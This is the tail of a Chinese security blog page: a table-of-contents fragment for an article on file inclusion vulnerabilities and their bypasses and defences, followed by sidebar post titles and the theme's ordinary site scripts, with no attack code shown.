class="toc-text">3.7 包含上传文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#38-%E5%85%B6%E4%BB%96%E5%8C%85%E5%90%AB%E5%A7%BF%E5%8A%BF"><span class="toc-number">1.3.8.</span> <span class="toc-text">3.8 其他包含姿势</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#41-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.1.</span> <span class="toc-text">4.1 指定前缀绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#411-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">4.1.1 目录遍历</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#412-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">4.1.2 编码绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#42-%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.2.</span> <span class="toc-text">4.2 指定后缀绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#421-%E5%88%A9%E7%94%A8url"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">4.2.1 利用url</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#422-%E5%88%A9%E7%94%A8%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">4.2.2 利用协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#423-%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">4.2.3 长度截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#424-00%E6%88%AA%E6%96%AD"><span class="toc-number">1.4.2.4.</span> <span class="toc-text">4.2.4 %00截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#425-%E7%82%B9%E5%8F%B7%E6%88%AA%E6%96%AD"><span class="toc-number">1.4.2.5.</span> <span class="toc-text">4.2.5 点号截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#426-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.2.6.</span> <span class="toc-text">4.2.6 双写绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#427-%E5%A4%A7%E5%B0%8F%E5%86%99%E6%B7%B7%E5%90%88%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.2.7.</span> <span class="toc-text">4.2.7 大小写混合绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E6%BC%8F%E6%B4%9E%E9%98%B2%E6%8A%A4"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 漏洞防护</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/08/thm-yun-xing-shi-gui-bi-jian-ce/" title="THM-运行时规避检测">THM-运行时规避检测</a><time datetime="2024-08-08T14:19:16.000Z" title="发表于 2024-08-08 22:19:16">2024-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC">THM-ByPass_UAC</a><time datetime="2024-08-08T07:36:41.000Z" title="发表于 2024-08-08 15:36:41">2024-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/07/thm-qian-ming-gui-bi/" title="THM-签名规避">THM-签名规避</a><time datetime="2024-08-07T09:11:33.000Z" title="发表于 2024-08-07 17:11:33">2024-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/05/windows-ti-quan-zong-jie/" title="Windows提权总结">Windows提权总结</a><time datetime="2024-08-05T02:59:37.000Z" title="发表于 2024-08-05 10:59:37">2024-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/02/thm-dai-ma-hun-yao-yuan-li/" title="THM-代码混淆原理">THM-代码混淆原理</a><time datetime="2024-08-02T01:46:10.000Z" title="发表于 2024-08-02 09:46:10">2024-08-02</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">199</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>36</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>